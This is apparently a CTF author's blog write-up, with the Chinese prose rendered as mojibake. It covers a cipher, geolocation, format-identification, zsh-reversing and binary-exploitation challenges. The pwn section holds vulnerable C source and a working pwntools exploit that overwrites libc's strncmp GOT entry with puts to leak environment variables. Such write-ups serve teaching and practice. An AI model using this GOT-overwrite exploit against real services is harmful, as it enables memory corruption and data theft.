---
title: 2025 æ–°å¹´ç«ç®­æ¯
date: 2025/02/13 14:29:00
updated: 2025/02/13 18:45:00
tags:
    - challenge author
    - got-hijack
    - libc-hook
    - multi-directions
thumbnail: /assets/trueblog/newyear2025/banner.png
excerpt: å»å¹´é™¤å¤•å°±æäº†â€œç¬¬ä¸€å±Šç«ç®­æ¯â€ï¼Œä»Šå¹´æ–°ä¸€å±Šæ¥äº†ï¼å¥–é‡‘åŠ ç åˆ°300å…ƒï¼Œé¢˜ç›®å¢åŠ ä¸€é¢˜ï¼Œè¿˜æ­å»ºäº†ä¸“ç”¨å¹³å°ï¼ˆè™½ç„¶æ²¡ä»€ä¹ˆäººåšï¼‰ã€‚ä¸€èµ·æ¥çœ‹çœ‹å¹³å°æ­å»ºå’Œé¢˜ç›®è¯¦è§£å§
---

å»å¹´æ•´äº†4é¢˜ï¼Œåœ¨qqä¸Šåˆ†å‘ï¼Œæ€»å…±å‘äº†200ã€‚ä»Šå¹´èµšäº†ç‚¹ç±³ï¼Œå¥–é‡‘åŠ åˆ°äº†300å…ƒï¼Œè¿˜ä¸“é—¨å¼€è®¾äº†æ–°å¹³å°ï¼Œ
ç”±äºéš¾åº¦æœ‰æ‰€ä¸Šæµ®ï¼Œå¤§å®¶åšçš„ç§¯ææ€§å¹¶ä¸é«˜ï¼Œä¸è¿‡è‡³å°‘æ¯ä¸ªæ–¹å‘éƒ½æœ‰äººå‡ºã€‚

{% note green fa-arrow-up-right-from-square %}
ç°åœ¨å°±å¯ä»¥è®¿é—®: https://newyear.rocketma.dev
{% endnote %}

## æ‰‹æ“å¹³å°

æ—¢ç„¶æ˜¯å¦‚æ­¤å°å‹çš„æ¯”èµ›ï¼Œè‡ªä¸å¿…ä½¿ç”¨ctfdç­‰å¤§å‹å¹³å°ã€‚ä¸ºäº†é¡ºä¾¿äº†è§£ä¸€ç‚¹å‰ç«¯çš„çŸ¥è¯†ï¼Œ
æˆ‘è‡ªå·±ç”¨Flaskæ‰‹æ“äº†ä¸€ä¸ªå¹³å°ã€‚åœ¨ä½¿ç”¨qwen2.5ç”Ÿæˆä¸€æ®µèµ·å§‹htmlåï¼Œæˆ‘å°±å¼€å§‹è‡ªå·±æ¢ç´¢ï¼Œ
å®Œæˆäº†å‰©ä¸‹ç½‘é¡µçš„æ„å»ºã€‚æˆ‘æ€»å…±èŠ±äº†2å¤©æ—¶é—´æ¥æ‰‹æ“ï¼Œä¸å¾—ä¸è¯´ï¼Œç›¸æ¯”ä»¥å‰ï¼Œæœ‰äº†llmåï¼Œ
aiå†™å‚è€ƒä»£ç æ–¹ä¾¿äº†å¾ˆå¤šã€‚

{% note blue fa-warehouse %}
webuiç°å·²å¼€æº: https://github.com/RocketMaDev/RocketCup2025WebUI
{% endnote %}

è¾¹å­¦è¾¹å†™ï¼Œæˆ‘è‡ªå­¦äº†ä¸€éƒ¨åˆ†csså’Œjsï¼Œå¯¹äºå¼¹çª—ï¼Œé‡‡ç”¨äº†jsåŠ¨æ€æ³¨å…¥çš„æ–¹å¼ï¼ŒåŒæ—¶ç•Œé¢åšäº†ä¸€å®šç¨‹åº¦çš„ç¾åŒ–ï¼Œ
çœ‹èµ·æ¥åº”è¯¥æ˜¯æ¯”è¾ƒç°ä»£åŒ–çš„ã€‚è™½ç„¶æ¯”ä¸è¿‡ret2shellç­‰å¤§å‹å¹³å°ï¼Œä½†æ˜¯å¯¹äºè¿‡å¹´å°æ¯”èµ›ï¼Œflagå›ºå®šçš„æƒ…å†µæ¥è¯´ï¼Œ
å·®ä¸å¤šæ˜¯å¤Ÿç”¨äº†ã€‚REST APIéƒ¨åˆ†å…¨éƒ¨é‡‡ç”¨GETï¼ŒåŸºæœ¬ä¸Šéå†äº†æ‰€æœ‰æƒ…å†µï¼Œä¸ä¼šå‡ºä»€ä¹ˆbugã€‚

æœ€åéƒ¨ç½²ï¼Œä½¿ç”¨`gunicorn`æ¥åˆ†å‘flaskæœåŠ¡ï¼Œæ­å»ºåœ¨æœ¬æœºä¸Šï¼Œé€šè¿‡nginxåšåå‘ä»£ç†ï¼Œ
ç»‘å®šåˆ°æœºå™¨çš„443ç«¯å£ã€‚1Panelç¡®å®å¥½ç”¨ï¼Œé€šè¿‡webå‰ç«¯å¯ä»¥å¾ˆæ–¹ä¾¿åœ°è®¾ç½®let's encryptçš„è¯ä¹¦ï¼Œ
æŸ¥çœ‹webæ—¥å¿—ï¼Œè®¾ç½®é˜²ç«å¢™è§„åˆ™ä»€ä¹ˆçš„ã€‚

{% note yellow fa-circle-exclamation %}
`torus`æ˜¯ **MyFonts** ä¸Šçš„ä¸“æœ‰å­—ä½“ï¼Œè™½ç„¶osuä¸­æœ‰ç”¨åˆ°ï¼Œä½†æ˜¯æˆ‘æ²¡æœ‰ç‰ˆæƒæ¥åˆ†å‘ï¼Œ
å› æ­¤ä»“åº“ä¸­æ²¡æœ‰åŒ…å«ã€‚
{% endnote %}

## é¢˜è§£

æ‰€æœ‰çš„é™„ä»¶å¯ä»¥åœ¨[å¹³å°ä»“åº“çš„Releases](https://github.com/RocketMaDev/RocketCup2025WebUI/releases/tag/release)
ä¸­æ‰¾åˆ°
### ä½ çš„ç¬¬ä¸€ä¸ªçº¢åŒ…ï¼

> NWERFnen0es4yEYA{3cEcd1Es}

çœ‹èµ·æ¥åƒæ˜¯æ …æ ç¼–ç ï¼Œä¸€æŠŠæ¢­

![fence](/assets/trueblog/newyear2025/fence.png)

{% note default fa-flag %}
`NEWYEAR{F3nceEnc0de1sE4sy}`
{% endnote %}

### find $(pwd)

> ä¸‹è½½å›¾ç‰‡ï¼Œçœ‹çœ‹æˆ‘æ˜¯ä»å“ªé‡Œæ‹çš„ï¼Ÿï¼ˆä¸æ˜¯åœ¨æ‹å“ªï¼‰  
> flagæäº¤æ ¼å¼ï¼š`NEWYEAR{str(sha256(f"{ç»åº¦:.2f},{çº¬åº¦:.2f}"))[:18]}`

{% folding grey::ç…§ç‰‡ %}
![](/assets/trueblog/newyear2025/img.jpg)
{% endfolding %}

è¿™å¼ ç…§ç‰‡æ‹çš„æ˜¯è¥¿æ¹–æ—è¾¹çš„å…«å¦ç”°ï¼Œå°†ç…§ç‰‡å¯¹ç€åœ°å›¾æ‘†ä¸€æ‘†å¯ä»¥æ¨æµ‹å‡ºæˆ‘æ˜¯ä»å…¶è¥¿åŒ—å¤„çš„å±±ä¸Šæ‹çš„ï¼Œ
åœ¨å±±å¡ä¸Šå–ä¸€ä¸ªæ–¹ä¾¿æ‹ç…§çš„åœ°ï¼Œåæ ‡å¤§çº¦æ˜¯`120.14,30.21`ï¼Œå› æ­¤è®¡ç®—å…¶sha256å¾—åˆ°flagã€‚

<img src="/assets/trueblog/newyear2025/position.png" height="70%" width="70%">

{% note default fa-flag %}
`NEWYEAR{2b699aff46606103b4}`
{% endnote %}

### unpacker

> çœŸæœ‰è¿™ä¹ˆå¤šæ•°æ®äº¤æ¢æ ¼å¼ï¼Ÿ  
> æ‰¾å‡ºå‹ç¼©åŒ…ä¸­1234æ–‡ä»¶åˆ†åˆ«å¯¹åº”çš„æ ¼å¼ï¼Œä»å…¶ä¸­æ–‡ç»´åŸºç™¾ç§‘é¡µé¢æå–urlçš„æœ€åä¸€ä¸ªå­—æ®µï¼Œ
> å¹¶ç”¨ç©ºæ ¼æ‹¼æ¥èµ·æ¥ï¼Œsha256åå¾—åˆ°flagã€‚  
> ä¾‹å¦‚ï¼š1234åˆ†åˆ«å¯¹åº”w x y zï¼Œwçš„ç»´åŸºurlæ˜¯https://zh.wikipedia.org/wiki/W ï¼Œé‚£ä¹ˆå–Wã€‚
> w x y zæœ€åå¾—åˆ°W X Y Zï¼Œä½¿ç”¨`sha256(['W', 'X', 'Y', 'Z'].join(' '))[:18]`åŒ…ä¸Š
> `newyear{}`åå¾—åˆ°flagã€‚

æ²¡å•¥å¥½è¯´çš„ï¼Œå°±æ˜¯è®¤æ ¼å¼ã€‚ä»1åˆ°4åˆ†åˆ«æ˜¯avro, bson, msgpack, protobufã€‚
è®¡ç®—`sha256('Apache_Avro BSON MessagePack Protocol_Buffers')`

{% note default fa-flag %}
`NEWYEAR{459794aa79b251ddd8}`
{% endnote %}

### crackZsh

> å»å¹´æ˜¯bashè„šæœ¬é€†å‘ï¼Œä»Šå¹´zshè„šæœ¬å·åœŸé‡æ¥ï¼

ä¸ºäº†æ–¹ä¾¿è°ƒè¯•ï¼Œå¯ä»¥æŠŠ`verify`ä¸­ç”¨æ¥å¤„ç†å¼‚å¸¸çš„å¤§æ‹¬å·å»æ‰ï¼Œç„¶ååœ¨å‘ç”Ÿé”™è¯¯æ—¶ï¼Œ
æŠŠreturnç ä¿®æ”¹æ–¹ä¾¿traceï¼Œè¿™æ ·å°±å¯ä»¥å¾ˆæ–¹ä¾¿åœ°å®šä½éªŒè¯è¿›åº¦ã€‚
ä»¥ä¸‹æ˜¯è¿˜åŸåçš„è„šæœ¬ä¸é…å¥—çš„è§£é‡Šï¼Œå¯ä»¥çœ‹å‡ºæ¸è¿›å¼éªŒè¯flagçš„è¿‡ç¨‹ã€‚

å…¶ä¸­`typeset -A arr`çš„ä½œç”¨æ˜¯å°†å…¶ç±»å‹è®¾ä¸ºå“ˆå¸Œè¡¨ã€‚å…¶ä»–çš„zshç‰¹æ€§å¯ä»¥æŸ¥é˜…
[zshguide](https://github.com/goreliu/zshguide)ã€‚

```zsh restored.zsh
#!/bin/zsh

print Input your flag to get your red envelop!
read FLAG

verify() {
    typeset -A arr
    FLAG=$1
    # é™å®šflagé•¿åº¦å’Œèµ·å§‹ã€æœ«å°¾
    if [[ $#FLAG -ne 27 ]] || [[ $FLAG[1,8] != "NEWYEAR{" ]] || [[ $FLAG[-1] != "}" ]] {
        return 1
    }
    # NEWYEAR{xxxxxxxxxxxxxxxxxx}
    # dateçš„ç¬¬6ä¸ªè¯æ˜¯2025ï¼Œå› æ­¤ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸º2
    tmp=$FLAG[9]
    param=$(printf '{print $%d}' $(($tmp+4)))
    if [[ $(LC_ALL=C date | awk $param) != "2025" ]] {
        return 2
    }
    # NEWYEAR{2xxxxxxxxxxxxxxxxx}
    # è¯»å…¥å½“å‰è„šæœ¬çš„å†…å®¹åˆ°bufä¸­ï¼Œå¯»æ‰¾ç¬¬9å­—ç¬¦å¤„çš„2ä¸ªå­—ç¬¦ï¼Œå³sh
    buf=$(<$2)
    if [[ $buf[(i)$FLAG[10,11]] -ne 9 ]] {
        return 3
    }
    # NEWYEAR{2shxxxxxxxxxxxxxxx}
    # ç¬¬12å­—ç¬¦å¤„ä¸º3
    if [[ $FLAG[$((10 + $tmp))] -ne $(($tmp + 1)) ]] {
        return 4
    }
    # NEWYEAR{2sh3xxxxxxxxxxxxxx}
    # æŸ¥è¡¨å¾—åŸå§‹å­—ç¬¦ä¸²ä¸º"Ll"ï¼Œç”±äºæœ‰"C"ï¼Œå› æ­¤åŸå…ˆå¯èƒ½æ˜¯llï¼Œç”±md5sumå¯ä»¥éªŒè¯
    arr=(L o r e m I p s u m A l i q o a V e l i t x)
    buf=${(C)${FLAG[13,14]}}
    if [[ "$arr[$buf[1]]$arr[$buf[2]]" != "oi" ]] || [[ $(print $FLAG[13,14] | md5sum | cut -c -5) != "243c4" ]] {
        return 5
    }
    # NEWYEAR{2sh3llxxxxxxxxxxxx}
    # ç¬¬15å­—ç¬¦å¤„çš„ç ä½ä¸º95ï¼Œå³_
    if [[ $(python -c "print(ord('$FLAG[15]'))") -ne 95 ]] {
        return 6
    }
    # NEWYEAR{2sh3ll_xxxxxxxxxxx}
    # (?? << 2) - 289 == 95ï¼Œæ¨æ–­å‡ºåŸæ¥æ˜¯96
    buf=$(($FLAG[16,17] << $tmp))
    if [[ $(python -c "print(chr($buf - 289))") != $FLAG[15] ]] {
        return 7
    }
    # NEWYEAR{2sh3ll_96xxxxxxxxx}
    # ä»"96"å¤„æˆªæ–­åï¼Œç¬¬3 4å­—ç¬¦å’Œ"96"ç­‰åŒ
    buf=$FLAG[16,17]
    tmp=${FLAG#*$buf}
    if [[ $tmp[3,4] != $buf ]] {
        return 8
    }
    # NEWYEAR{2sh3ll_96xx96xxxxx}
    # hex(96 + 96) => 16#C0ï¼Œå–3 4å­—ç¬¦å°å†™ä¸ºc0
    buf=$(([#16] $(($FLAG[16,17] + $FLAG[20,21]))))
    tmp=${buf:l}
    if [[ $tmp[4,5] != $FLAG[18,19] ]] {
        return 9
    }
    # NEWYEAR{2sh3ll_96c096xxxxx}
    # å°†22 23å­—ç¬¦è§†ä¸ºæ¬¡æ•°ï¼Œé‡å¤å‘bufé™„åŠ 3ä¸ªå­—ç¬¦ï¼Œæ ¹æ®bufé•¿åº¦ç©·ä¸¾çˆ†ç ´ï¼Œæ¨å¾—bufé•¿åº¦ä¸º45ï¼Œå³è¿™ä¸¤ä¸ªå­—ç¬¦ä¸º15
    buf=
    repeat $FLAG[22,23] {
        buf+=$FLAG[24,26]
    }
    if [[ $(print $#buf | sha256sum | cut -c -5) != "42000" ]] {
        return 10
    }
    # NEWYEAR{2sh3ll_96c09615xxx}
    # å°†bufä¸­æ‰€æœ‰daæ›¿æ¢ä¸ºadï¼Œè¦æ±‚å‰6ä¸ªå­—ç¬¦ä¸º_dca__ï¼Œåœ¨å˜æ¢å‰å°±æ˜¯d_c_a_ï¼Œå› ä¸ºå­—ç¬¦æŒ‰3ä¸ªä¸€ç»„æ˜¯ä¸æ–­é‡å¤çš„ï¼Œå› æ­¤è¿™6ä¸ªå­—ç¬¦å°±æ˜¯dacdac
    buf=${buf//da/ad}
    if [[ $buf[2,4] != "dca" ]] {
        return 11
    }
    # NEWYEAR{2sh3ll_96c09615dac}
    return 0
}

verify $FLAG $0
err=$?
if [[ $err -eq 0 ]] {
    print Flag verified, congratulations!
} else {
    print Incorrect flag: $err
}
```

{% note green fa-heart %}
æœ¬é¢˜åªæœ‰ *mantle* åšå‡ºï¼Œå¤ªå¼ºäº†ï¼
{% endnote %}

{% note default fa-flag %}
`NEWYEAR{2sh3ll_96c09615dac}`
{% endnote %}

### put?env!

> Flagæ”¾åœ¨ç¯å¢ƒå˜é‡é‡Œï¼Œä½†æ˜¯è¦è¢«è¦†å†™äº†ğŸ˜¨  
> æ²™ç®±ä¸­é™¤äº†readå’Œwriteä»¥å¤–çš„ç³»ç»Ÿè°ƒç”¨ï¼Œéƒ½åªæ˜¯ä¸ºäº†è®©ç¨‹åºä¸ä¼¼ï¼Œä¸æ˜¯ç”¨æ¥åˆ©ç”¨çš„  
> libcæ˜¯2.35-0ubuntu3.8_amd64  
> nc newyear.rocketma.dev 1337

{% folding purple::é¢˜ç›®æºç  %}
```c putenv.c
#include <stdlib.h>
#include <stdbool.h>
#include <stdio.h>
#include <seccomp.h>

void sandbox(void) {
    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
    if (!ctx)
        goto kill;
    int rc = seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
    if (rc < 0)
        goto kill;
    rc = seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
    if (rc < 0)
        goto kill;
    rc = seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
    if (rc < 0)
        goto kill;
    rc = seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
    if (rc < 0)
        goto kill;
    rc = seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(fstat), 0);
    if (rc < 0)
        goto kill;
    rc = seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(lseek), 0);
    if (rc < 0)
        goto kill;
    rc = seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(newfstatat), 0);
    if (rc < 0)
        goto kill;
    rc = seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(brk), 0);
    if (rc < 0)
        goto kill;
    rc = seccomp_load(ctx);
    if (rc < 0)
        goto kill;
    return;
kill:
    exit(-1);
}

int main(void) {
    setbuf(stdout, NULL);
    unsigned long arr[3] = {0x2025, 0x6666, 0x8888};
    puts("Happy 2025!");
    puts("You got one chance to set value");
    long recv = 0;
    bool done = false;
    sandbox();
    do {
        puts("Which to set?");
        printf("IDX > ");
        int err = scanf("%ld", &recv);
        while (getchar() != '\n');
        if (!err)
            continue;
        if (recv >= 3)
            puts("No way!!");
        else {
            printf("Is this what you want? %#lx\n", arr[recv]);
            printf("[Y/n] ");
            int ch = getchar();
            if (ch == '\n' || (getchar(), ch == 'y'))
                done = true;
        }
    } while (!done);
    done = false;
    do {
        puts("Tell me what you want");
        printf("VAL > ");
        int err = scanf("%ld", arr + recv);
        if (!err) {
            while (getchar() != '\n');
            continue;
        }
        done = true;
    } while (!done);
    puts("Now the FLAG is gone!");
    setenv("FLAG", "", 1);
    return 0;
}
```
{% endfolding %}

ä¿æŠ¤å…¨å¼€ï¼Œ64ä½ã€‚ç”±äºlibcæ˜¯2.35ï¼Œå› æ­¤gotè¡¨å¯å†™ã€‚è¿™é“é¢˜çš„å‡ºé¢˜æ€è·¯å…¶å®æ¥æºäºä»Šå¹´å¼ºç½‘æ¯ï¼Œ
çœ‹ç‹¼ç»„çš„wpæ—¶å‘ç°æœ‰éé¢„æœŸå¯ä»¥è¯»ç¯å¢ƒå˜é‡ã€‚æŸ¥çœ‹æºç å¯çŸ¥ï¼Œ`setenv`è°ƒç”¨`__add_to_environ`ï¼Œ
è€Œåœ¨`__add_to_environ`ä¸­ï¼Œæœ‰ä¸€ä¸ªéå†æ‰€æœ‰ç¯å¢ƒå˜é‡çš„åœ°æ–¹ï¼š

```c stdlib/setenv.c
  ep = __environ;

  size = 0;
  if (ep != NULL)
    {
      for (; *ep != NULL; ++ep)
        if (!strncmp (*ep, name, namelen) && (*ep)[namelen] == '=')
          break;
        else
          ++size;
    }
```

åœ¨è¿™ä¸ªåœ°æ–¹ä¸éš¾çœ‹å‡ºæ‰€æœ‰ç¯å¢ƒå˜é‡éƒ½ä¼šç»å†ä¸€é`strncmp`ï¼Œå¹¶ä¸”ç¬¬ä¸€ä¸ªå‚æ•°æ°å¥½æ˜¯ç¯å¢ƒå˜é‡å­—ç¬¦ä¸²ã€‚
ä¸éš¾æƒ³åˆ°ï¼Œå¦‚æœæŠŠ`strncmp`çš„gotç»‘å®šåˆ°`puts`ï¼Œå°±å¯ä»¥æ³„éœ²æ‰€æœ‰ç¯å¢ƒå˜é‡ã€‚ç”±äº`puts`
çš„è¿”å›å€¼æ˜¯æ‰“å°çš„å­—ç¬¦æ•°ï¼Œå› æ­¤ä¸ä¼šå‡ºç°è¿›å…¥&&åˆ†æ”¯ã€‚

å› ä¸ºæˆ‘ç¦ç”¨äº†å‡ ä¹æ‰€æœ‰ç³»ç»Ÿè°ƒç”¨ï¼Œå¹¶ä¸”åªèƒ½å†™ä¸€ä¸ªQWORDï¼Œæ‰€ä»¥å¤§æ¦‚æ²¡æœ‰ä»€ä¹ˆéé¢„æœŸï¼Œ
ç›´åˆ° *å±±è¥¿å°å«¦å¨¥* æ¥å‘æˆ‘åé¦ˆã€‚

{% note green fa-heart %}
æ„Ÿè°¢ *å±±è¥¿å°å«¦å¨¥* çš„åé¦ˆï¼
{% endnote %}

ç”±äºæŒ‡é’ˆæ˜¯æ— ç¬¦å·æ•°ï¼Œè€Œè¾“å…¥æ—¶`recv`éœ€è¦ä¹˜ä»¥8æ‰ä¼šä¸æŒ‡é’ˆç›¸åŠ ï¼Œå› æ­¤å®Œå…¨å¯ä»¥é€šè¿‡æ§åˆ¶è¾“å…¥ï¼Œ
ä½¿å¾—`recv * 8`ä¸ºå¤§äº3çš„æ­£æ•°ï¼Œä»è€Œå®ç°ç¯å¢ƒå˜é‡åŒºçš„ä»»æ„è¯»ã€‚äºæ˜¯æˆ‘åŠ äº†ä»¥ä¸‹è¿™ä¸€æ¡patch
æ¥ä½¿å¾—è¿™ä¸ªtrickä¹Ÿä¸èƒ½é€šè¿‡æ£€æŸ¥ã€‚

```diff fix-wrap-arround.patch
--- putenv.c
+++ putenv.c
@@ -56,3 +56,3 @@
             continue;
-        if (recv >= 3)
+        if (recv >= 3 || arr + recv > arr + 3)
             puts("No way!!");
```

{% note blue fa-face-sad-tear %}
ç„¶è€Œï¼Œæˆ‘åœ¨é‡æ–°ç¼–è¯‘ç¨‹åºåï¼Œç¡®å®æ›´æ–°äº†xinetdæœåŠ¡çš„äºŒè¿›åˆ¶ï¼Œå´å¿˜è®°æ›´æ–°webæœåŠ¡åˆ†å‘çš„äºŒè¿›åˆ¶ã€‚
ä¹Ÿå°±æ˜¯è¯´ï¼Œä¿®è¡¥åç½‘é¡µä¸Šåˆ†å‘çš„ç¨‹åºå’Œå®é™…è·‘çš„ç¨‹åºå¹¶ä¸æ˜¯åŒä¸€ä¸ªï¼Œå¹¶ä¸”ç›¸å…³çš„åç§»ä¹Ÿå˜äº†ï¼Œ
å› æ­¤å†™å‡ºâ€œæ­£ç¡®â€çš„è„šæœ¬ä¹Ÿæœ‰å¯èƒ½æ‰“ä¸é€šï¼Œå‘å¤§å®¶é“æ­‰ã€‚
{% endnote %}

æœ€åï¼Œè§£é¢˜æ€è·¯å°±æ˜¯ä»æ ˆä¸Šè·å–libcåŸºå€å’Œæ ˆåŸºå€ï¼Œè®¡ç®—å¾—åˆ°`libc.got['strncmp']`çš„ä½ç½®ï¼Œ
åˆ©ç”¨å”¯ä¸€çš„ä¸€æ¬¡ä¿®æ”¹ï¼Œå°†å…¶æ”¹ä¸º`puts`ï¼Œè¿™æ ·åœ¨`setenv`æ—¶å°±ä¼šæ‰“å°å‡ºæ‰€æœ‰flagã€‚expï¼š

```python putenv.py
from pwn import *
context.terminal = ['tmux','splitw','-h']
context.arch = 'amd64'
GOLD_TEXT = lambda x: f'\x1b[33m{x}\x1b[0m'
EXE = './putenv'

def payload(lo: int):
    global sh
    if lo:
        sh = process(EXE)
        if lo & 2:
            gdb.attach(sh)
    else:
        sh = remote('newyear.rocketma.dev', 1337)
    libc = ELF('/home/Rocket/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6')

    def select(idx: int, goon: bool) -> int:
        assert idx < 3
        sh.sendlineafter(b'IDX', str(idx).encode())
        sh.recvuntil(b'want?')
        key = int(sh.recvline(), 16)
        sh.sendlineafter(b'Y/n', b'n' if goon else b'y')
        return key

    libcBase = select(-15, True) - libc.symbols['_IO_2_1_stdout_']
    success(GOLD_TEXT(f"Leak libcBase: {libcBase:#x}"))
    libc.address = libcBase

    arrayBase = select(-6, True) + 8
    success(GOLD_TEXT(f"Leak arrayBase: {arrayBase:#x}"))

    select((libc.got['strncmp'] - arrayBase) // 8, False)
    sh.sendlineafter(b'VAL', str(libc.symbols['puts']).encode())

    sh.recvuntil(b'NEWYEAR{')
    flag = b'NEWYEAR{' + sh.recvuntil(b'}')
    success(f"Flag is: {flag.decode('utf-8')}")
    sh.close()
```

{% note default fa-flag %}
![](/assets/trueblog/newyear2025/flag.png)
{% endnote %}

## å‚è€ƒ

[Zsh å¼€å‘æŒ‡å—](https://github.com/goreliu/zshguide)
